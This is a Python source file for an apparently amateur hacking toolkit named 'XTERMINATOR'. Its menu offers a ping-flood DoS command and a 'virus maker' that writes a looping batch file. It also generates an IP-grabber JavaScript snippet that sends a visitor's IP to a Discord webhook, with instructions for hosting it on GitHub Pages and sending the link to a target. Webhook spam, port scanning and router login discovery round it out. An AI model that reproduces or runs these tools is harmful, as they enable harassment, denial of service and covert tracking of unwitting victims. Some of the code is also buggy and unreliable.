import os
import time
import requests # Required to install
import colorama # Required to install
import socket
from colorama import Fore
title = """
----------------------------------------------------------------------------------------------

██╗  ██╗██╗        ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ████████╗███████╗
╚██╗██╔╝ ╚██╗      ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗╚══██╔══╝██╔════╝
 ╚███╔╝    ╚██═╗      ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║   ██║   █████╗  
 ██╔██╗   ██═══╝      ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║   ██║   ██╔══╝  
██╔╝ ██╗██╔╝███████╗  ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║   ██║   ███████╗
╚═╝  ╚═╝╚═╝ ╚══════╝  ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
                                                                                           
----------------------------------------------------------------------------------------------                                                                                          
"""
print(f"{Fore.BLUE}",title)
title2 = """ 
                   I'll be back, with your IP - XTERMINATOR
                   |______________________________________|

                            /help for more info
"""
print(f"{Fore.WHITE}",title2)
def main():
 while True:
  inputting = str(input(f"{Fore.GREEN}X> "))

  if inputting == "/help":
   helpme = """
   ====================================================
   List of Available command

   /help         -- Shows list of commands
   execute       -- Executes any Discord bots commands
   exit          -- Exits this program
   music         -- Play background music
   fb            -- Write us a feedback
   ip            -- Shows advance options with IP
   spam          -- Spams messages via Discord Webhook
   usrshutdown   -- Remote shutdown
   v             -- Program version
   virusmkr      -- Makes a virus of your choice

   ====================================================
   """
   print(f"{Fore.WHITE}", helpme)
 
  if inputting == "usrshutdown":
   os.system("shutdown -i")

  if inputting == "virusmkr":
   virusinput = str(input(f"{Fore.GREEN}""> Input what program should It open > "))
   viruscreate = open("RENAME_ME.bat", "w")
   viruscreate.write(f"""@echo off
     :GYATT_STANDS_FOR_GO_YOU_AMAZING_TEENAGERS
     start {virusinput}
     goto GYATT_STANDS_FOR_GO_YOU_AMAZING_TEENAGERS
             """)
   viruscreate.close()
   print(f"{Fore.WHITE}""Success!")


  if inputting == "exit":
   exit()
   

  if inputting == "music":
   from playsound import playsound
   print(f"{Fore.WHITE}""You may need to uhhhh run a new XTERMINATE program")
   playsound("music/hackermusic.mp3")

  if inputting == "ip":
   print(f"{Fore.WHITE}""Type /help for available commands")
   ip()



def ip():
   while True:
    ipinputting = str(input(f"{Fore.GREEN}""ip> "))
    if ipinputting == "/help":
     helpme2 = """
     ============================================================
     List of Available IP advance command
 
     /help         -- Shows list of commands
     exit          -- Exits out IP section
     ipinfo        -- Shows information about the IP address
     pingdos       -- Floods router with junk
     gig           -- Generates IP grabber source code
     portscan      -- Scans open ports
     router        -- Scans for router website login

     ============================================================
     """
     print(f"{Fore.WHITE}",helpme2)

    if ipinputting == "pingdos":
     ipflood = str(input(f"{Fore.WHITE}"" > Input an IP address > "))
     os.system(f"ping -n 999 -l 65500 {ipflood}")
  
    if ipinputting == "gig":
     ipfetchcode = """
     async function apiget() {try {const hook = 'insert webhook here';const url = await fetch('https://api.ipify.org?format=json'); const data = await url.json();const info = data.ip;const msg = 'insert message here';await fetch(hook, {method: 'POST',body: { 'Content-Type': 'application/json' },header: JSON.stringify({ content: `${msg.value} ${info}` })});} catch{}}    apiget()      
     """
     howto = """
     How to SetUp:

     1. Make a HTML file and paste the generated code there (remember to config ur generated code)
     2. Go to any website publisher (Recommend Github)
     3. Create a reposetory and upload ur HTML file there
     4. Go to reposetory settings
     5. Go to Github pages
     6. Click Pages
     7. Config Build Deployment to 'Deploy from branch' and Branch to 'main' and 'root' and click save
     8. Go to your main reposetory page (Code section)
     9. Click on Green dot
     10. Copy ur web url to ur target and boom

     Incase you dont understand it, goto https://www.youtube.com/watch?v=BT4WzyT2g8k
     """
     print(f"{Fore.WHITE}",ipfetchcode)
     print(f"{Fore.YELLOW}",howto)

    if ipinputting == "ipinfo":
     ipinput = input("> Input IP address > ")
     ipurl = requests.get(f"http://ip-api.com/json/{ipinput}")
     ippractice = ipurl.json() 
     print(f"{Fore.WHITE}{ippractice}",f"'host':{socket.gethostbyaddr(ipinput)}")

    if ipinputting == "portscan":
     portIP = str(input("> Input IP > "))
     port = int(input("> Input port > "))
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     t = s.connect_ex((portIP,port))
     if t == 0:
      print(f"{Fore.WHITE} [+]Port {port} found")
     elif t != 0:
      print(f"{Fore.RED} [-] Port {port} not found")


    if ipinputting == "router":
     iplists = ["192.168.1.1","192.168.0.1",
     "192.168.100.1","192.168.1.0","192.168.0.1","192.168.0.254",
     "192.168.10.1","10.0.0.1","10.1.1.1","192.168.1.253",
     "192.168.1.254","192.168.50.1","192.168.50.254","192.168.50.255"]
     for ip in iplists[:]:
       one = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       one.settimeout(3)
       two = one.connect_ex((ip,80))
       if two == 0:
         print(f"{Fore.WHITE} [+] FOUND {iplists[0]}")
         os.system(f"start http://{iplists[0]}")
         break
       else:
         print(f"{Fore.RED} [-] Not found")
         iplists.pop(0)


    if ipinputting == "exit":
     main()



main()